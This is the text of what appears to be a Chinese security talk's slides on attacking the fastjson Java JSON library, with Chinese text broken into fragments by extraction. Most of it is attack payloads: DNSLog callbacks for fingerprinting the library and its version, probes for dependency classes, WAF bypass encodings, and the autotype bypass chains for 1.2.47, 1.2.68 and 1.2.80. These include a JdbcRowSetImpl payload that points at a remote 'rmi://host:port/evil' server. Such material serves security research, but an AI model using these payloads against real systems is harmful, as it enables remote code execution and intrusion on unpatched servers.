Hacking JSON
CONTENTS
目录
1
3
4
JSON 介绍
Gadgets
JSON 反序
列化
2
tricks
fastjson 在
 GitHub 上有着 24.9K+ 的 star，
是一个深
受 Java 开发者
欢迎
的开源
 JSON 解析
器
，
它
可以解析
JSON格式
的字符串，
支持将
Java Bean转
为JSON字符串，
也可以从JSON字符串反序
列化到JavaBean，
或是将字符串解析
为 JSON 对象 。
fastjson 介绍
JSON 要转
为 JavaBean 通
常
必须开启
 autotype，
而 autotype 默
认情
况下是关闭状
态，
所
以不
能
够在
未开启
的情
况下去反序
列化指
定
的类。
JSON to Bean
JSON = {"@type":"fastjson.SimpleBean","var":"foo"}
public class SimpleBean {
    private String var;
    public String getVar() {
        return var;
    }
    public void setVar(String var) {
        this.var = var;
    }
}
(SimpleBean) JSON.parse(json);
JSON.parseObject(json,SimpleBean.class);
JSON.parseObject(json).toJavaObject(SimpleBean.class);
SimpleBean bean = new SimpleBean();
bean.setVar("foo");
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
AutoType 默
认关闭
JSON.parse('{"@type":"fastjson.SimpleBean","var":"foo"}')
checkAutoType(String typeName,Class expectClass,int features)
ObjectDeserializer getDeserializer(Type type)
T deserialze(...)
class whitelist mappings
class use @JSONType
enable autotype
class extends expectClass
enable safeMode
class not found
class blacklist
非继承自期望类
其他
pass
reject
JavaBeanDeserializer  MiscCodec
ThrowableDeserializer MapDeserializer ...
JSON 解析
流
程
exit
JavaBean 实例化机
制
构造
方法
•
优先选无参构造
•
没
有无参构造
会选取
唯一的构造
方法
•
如
有多个构造
方法，
优先选参数
最
多的public构造
方法
•
如
参数
最
多的构造
方法有多个则随机
选取
一个构造
方法。
•
如
果
被实例化的是静态内部
类，
也可以忽视
修饰
符
•
如
果
被实例化的是非
public类，
构造
方法里
的的参数
类型
仍然可以进一步
反序
列化
setter 
•
Field是public时
可以不
用setter方法
•
其它
需
要public的setter方法。
{"@type":"SimpleBean" ...}
public class SimpleBean {
    private String var1;
    public SimpleBean(){}
    public void setVar(String var1) {
        this.var1 = var1;
    }
}
public class SimpleBean {
    public SimpleBean(String var1,
String var2){...}
    public SimpleBean(String var1,
String var2,String var3)
    {...}
}
public class SimpleBean {
    public SimpleBean(String var1,String 
var2){...}
    public SimpleBean(String var1,String 
var2){...}
 }
tricks
{{"@type":"java.net.URL","val":"http://dnslog.com"}:"a"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"}}
dnslog.com
DNSLog 鉴别 fastjson
{"a":1,"b":"EQ==","c":[{}],"d":"\u0000\u0000"}
{"a":new a(1),"b":x'11',/**/"c":Set[{}{}],"d":"\u0000\x00"}
{"ext":"blue","name":"blue"}
{"ext":"blue","name":{"$ref":"$.ext"}}
根
据
解析
变化判断
根
据
响应
状
态判断
{"@type":"whatever"}
com.alibaba.fastjson.JSONException: autoType is not support. 
whatever
org.json.JSONException: Unterminated string at 5 [character 0 line 2]
JSONObject jsonObject = new JSONObject("{a:'\r'}");
{a:b}
{"a":"b"}
{"a":1.1111111111111112}
str = #\r\n{a:1.11111111111111111111111111111111}
new Gson().fromJson(str, Object.class);
org.json
gson
{"a":1.1111111111111112}
str = {"a":1.11111111111111111111111111}/*#whatever
new ObjectMapper().readValue(str, Object.class)
{'a':'b'}
com.fasterxml.jackson.core.JsonParseException: Unexpected character (''' (code 39)): was expecting double-quote to 
start field name
str = {"name":"blue","age":18}
new ObjectMapper().readValue(str, Person.class)❌
jackson
s = JSONUtil.toXmlStr(JSONUtil.parse(
                "{'!DOCTYPE foo [  %dtd; ]> %dtd; ]>
hutool JSON
{a:what.ever}/*\r\n
xxx
{"a":"what.ever"}
[
  {"@type":"java.lang.Class","val":"java.io.ByteArrayOutputStream"},
  {"@type":"java.io.ByteArrayOutputStream"},
  {"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"}}
]
dnslog.com
fastjson 1.2.47 版本
探
测
[
  {"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"},
  {"@type":"java.io.ByteArrayOutputStream"},
  {"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"}}
]
fastjson 1.2.68 版本
探
测
dnslog.com
[           
{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","x":{"@type":"java.
net.InetSocketAddress"{"address":,"val":"first.dnslog.com"}}},
{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","message":{"@typ
e":"java.net.InetSocketAddress"{"address":,"val":"second.dnslog.com"}}}
]
first.dnslog.com
second.dnslog.com
first.dnslog.com
fastjson 1.2.80 版本
探
测
异常
回
显 fastjson 精确版本
号
syntax error, expect {, actual EOF, pos 0, fastjson-version 1.2.76
{"@type":"java.lang.AutoCloseable"
JSON.parseObject("whatever",Person.class);
探
测
依赖
环
境
org.springframework.web.bind.annotation.RequestMapping   spring
org.apache.catalina.startup.Tomcat
     tomcat
groovy.lang.GroovyShell
     groovy
com.mysql.jdbc.Driver
     mysql
java.net.http.HttpClient
     java 11
...
{"@type":"java.lang.Class","val":${variable}}
Class not found
null
Class exists
class com.mysql.jdbc.Driver  
DNSLog回
显探
测
依赖
库
{"@type":"java.net.Inet4Address",
    "val":{"@type":"java.lang.String"
        {"@type":"java.util.Locale",
        "val":{"@type":"com.alibaba.fastjson.JSONObject",{
            "@type": "java.lang.String""@type":"java.util.Locale",
            "language":{"@type":"java.lang.String"
                     {1:{"@type":"java.lang.Class","val":"TARGET_CLASS"}},
            "country":"x.l56y7u6g.dnslog.pw"
            }}
  }
Class not found
报错回
显探
测
依赖
库
"d":{"x":{"$ref":"$.c.contents"}}
}
127.0.0.1
localhost
255.255.255.255 broadcasthost
::1             
localhost
POST /login HTTP/1.1
Host:example.com
Connection: close
{
        "@type":"java.lang.Character"{
           "@type":"java.lang.Class",
           "val":"com.mysql.jdbc.Driver"
}
HTTP/1.1 200 
Content-Type: application/json
Content-Length: 150
{
"error":"Bad Request",
"message":"com.alibaba.fastjson.JSONException: can not cast to char, 
value : class com.mysql.jdbc.Driver",
"path":"/login"
}
1
2
3
4
5
1
2
3
4
5
------WebKitFormBoundaryAO5f48pfmr4ErWMN
Content-Disposition: form-data; name=json
Content-Transfer-Encoding: Base64
eyJAdHlwZSI6ImNvbS5zdW4ucm93c2V0LkpkYmNSb3dTZXRJbXBsIn0=
------WebKitFormBoundaryAO5f48pfmr4ErWMN--
------WebKitFormBoundaryAO5f48pfmr4ErWMN
Content-Disposition: form-data; name=json
Content-Transfer-Encoding: quoted-printable
=7B=22=40type=22=3A=22com.sun.rowset.JdbcRowSetImpl=22=7D
------WebKitFormBoundaryAO5f48pfmr4ErWMN--
{"@type":"com.sun.rowset.JdbcRowSetImpl"}
WAF Bypass
[11111111111111111111111111111111111...
,[11111111111111111111111111111111111...
,[11111111111111111111111111111111111...
,[11111111111111111111111111111111111...
,[11111111111111111111111111111111111...
,...,{'\x40\u0074\x79\u0070\x65':xjava.lang.AutoCloseable"...
]]]]]
大
量
字符
WAF Bypass
{,new:[NaN,x'00',{,/*}*/'\x40\u0074\x79\u0070\x65':xjava.lang.AutoClosea
ble"
1.2.68
1.2.47
1.2.80
FASTJSON反序列化
1.2.47 原
理
class whitelist mapping
java.lang.Exception
java.lang.Class
java.net.URL
com.sun.rowset.JdbcRowSetImpl
...
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://host:port/evil",
        "autoCommit":"true"
    }
}
MiscCodec
put
get
checkAutoType
1.2.68原
理
class whitelist mapping
java.lang.AutoCloseable
java.lang.Class
java.net.URL
java.io.ByteArrayOutputStream
...
{   "a":{
        "@type":"java.lang.AutoCloseable",
        "@type":"java.io.ByteArrayOutputStream"
    },"b":{
        "@type":"java.io.ByteArrayOutputStream",
}}
expectClass.isAssignableFrom(typeName) == true
put
get
1.2.80原
理
{   "a":{
        "@type":"java.lang.Exception",
        "@type":"ognl.OgnlException"
    }
}
class whitelist mapping
java.lang.Exception
java.lang.Class
java.net.URL
ognl.OgnlException
...
expectClass.isAssignableFrom(typeName) == true
修复方案
fastjson 共发布
过三次
修复内部
安全检
查
的版本
，
最
后
一次
修复版本
已在
 2022.5.23 发布
，
更
新到大
于